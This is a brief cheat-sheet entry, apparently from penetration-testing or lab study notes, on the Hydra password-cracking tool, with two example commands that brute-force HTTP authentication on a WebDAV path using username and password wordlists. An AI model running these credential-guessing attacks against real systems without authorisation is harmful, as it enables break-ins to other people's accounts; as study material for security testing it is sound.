# 🐉 Hydra
- Use to crack various protocol from
  FTP, SSH and Web authentication forms
- -L : file with usernames
- -P : file with passwords
- Example
  ```bash
  hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.2.17.124 http-get /webdav/
  ```
  ```bash
  hydra -l admin -P /usr/share/wordlists/metasploit/common_passwords.txt 10.2.17.124 http-get /webdav/
  ```

